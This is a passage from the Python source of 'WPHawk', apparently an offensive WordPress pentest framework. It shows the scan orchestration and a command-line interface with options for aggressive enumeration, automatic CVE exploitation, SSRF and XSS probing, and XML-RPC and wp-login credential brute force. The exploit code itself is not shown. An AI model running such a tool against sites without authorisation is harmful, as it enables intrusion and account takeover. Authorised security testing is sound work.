        if do_p:
            passive_enum_plugins(html, result)
            ok(f"Passive plugins: {len(result.plugins)} found")
        if do_t:
            passive_enum_themes(html, result)
            ok(f"Passive themes: {len(result.themes)} found")

        if args.aggressive:
            wl = load_wordlist(args.wordlist)
            if do_p:
                await aggressive_enum_plugins(session, result, wl, args.delay, args.concurrency)
                ok(f"After aggressive: {len(result.plugins)} plugins total")
            if do_t:
                await aggressive_enum_themes(session, result, wl, args.delay, args.concurrency)
                ok(f"After aggressive: {len(result.themes)} themes total")

        parallel = [
            check_sensitive_files(session, result),
            check_xmlrpc(session, result),
            check_security_headers(session, result),
            check_open_registration(session, result),
            check_directory_listing(session, result),
            check_wp_cron(session, result),
        ]
        if do_u:
            parallel.append(enumerate_users(session, result, args.max_users))
        await asyncio.gather(*parallel, return_exceptions=True)
        ok(f"Users: {len(result.users)} | Sensitive files (200): {sum(1 for f in result.sensitive_files if f['status']==200)}")
        if result.xmlrpc_accessible:
            warn(f"xmlrpc.php accessible — multicall: {'yes' if result.xmlrpc_multicall else 'no'}")

        # ── Phase 2.5: Deep Recon ────────────────────────────────────────────
        if args.deep_recon:
            section("PHASE 2.5 — DEEP RECON")
            await asyncio.gather(
                analyze_js_files(session, result, html),
                parse_robots_sitemap(session, result),
                discover_rest_endpoints(session, result),
                enumerate_subdomains(session, result),
                return_exceptions=True
            )

        # ── Phase 3: CVE Intelligence ────────────────────────────────────────
        if args.cve and db:
            section("PHASE 3 — CVE INTELLIGENCE + VERSION MATCHING")
            # First: check WP.org for latest versions
            await check_plugin_versions(session, result)
            # Then: fetch + version-filter CVEs
            await enrich_with_cves(session, result, db, args.refresh_cache)
            total_vuln = sum(len(p.vulnerable_cves) for p in result.plugins + result.themes)
            crits = [
                (p.slug, cve) for p in result.plugins + result.themes
                for cve in p.vulnerable_cves if cve.cvss_score >= 9.0
            ]
            if crits:
                warn(f"CRITICAL vulns ({len(crits)}):")
                for slug, cve in crits:
                    warn(f"  {slug} — {cve.cve_id} CVSS {cve.cvss_score} {cve.description[:60]}")

        # ── Phase 4: Exploitation ────────────────────────────────────────────
        if args.exploit:
            section("PHASE 4 — EXPLOITATION")
            await run_all_exploits(session, result, args, html)

    # ── Phase 5: Report ──────────────────────────────────────────────────────
    section("PHASE 5 — REPORT")
    generate_report(result, args.output, args.json)

    if db:
        await db.close()

# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="wphawk",
        description="WPHawk v2.0 — Advanced WordPress Pentest Framework"
    )
    parser.add_argument("-u","--url", required=True, help="Target WordPress URL")
    parser.add_argument("--enumerate", default="all",
        choices=["plugins","themes","users","all"], help="What to enumerate (default: all)")
    parser.add_argument("--aggressive", action="store_true",
        help="Enable HTTP probe enumeration")
    parser.add_argument("--wordlist", default=None,
        help="External plugin/theme slug wordlist")
    parser.add_argument("--max-users", type=int, default=20, dest="max_users",
        help="Max author IDs to probe (default: 20)")
    parser.add_argument("--delay", type=float, default=0.1,
        help="Delay between aggressive probes in seconds (default: 0.1)")
    parser.add_argument("--concurrency", type=int, default=10,
        help="Max parallel requests (default: 10)")
    parser.add_argument("--deep-recon", action="store_true", dest="deep_recon",
        help="Enable deep recon: JS analysis, REST discovery, robots.txt, subdomains via crt.sh")
    parser.add_argument("--cve", action="store_true",
        help="Enable CVE lookup + version-aware matching (NVD + GitHub + Patchstack + Exploit-DB)")
    parser.add_argument("--refresh-cache", action="store_true", dest="refresh_cache",
        help="Ignore local CVE cache and re-fetch")
    parser.add_argument("--exploit", action="store_true",
        help="Enable auto-exploitation (CVE exploits, SSRF, XSS, Host Header)")
    parser.add_argument("--auth-scan", action="store_true", dest="auth_scan",
        help="Authenticated wp-admin scan after credential discovery")
    parser.add_argument("--brute", action="store_true",
        help="XML-RPC multicall credential brute force")
    parser.add_argument("--brute-login", action="store_true", dest="brute_login",
        help="wp-login.php brute force (serial, slow)")
    parser.add_argument("--passwords", default=None,
        help="Password wordlist (default: built-in 100 passwords)")
    parser.add_argument("--output", default=None,
        help="Custom report output path")
    parser.add_argument("--json", action="store_true",
        help="Also save JSON report")
    parser.add_argument("--timeout", type=int, default=30,
        help="HTTP timeout in seconds (default: 30)")
    parser.add_argument("--no-verify-ssl", action="store_true", dest="no_verify_ssl",
        help="Disable SSL verification")

    args = parser.parse_args()
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print(f"\n{y('[!] Scan interrupted')}")
        sys.exit(0)
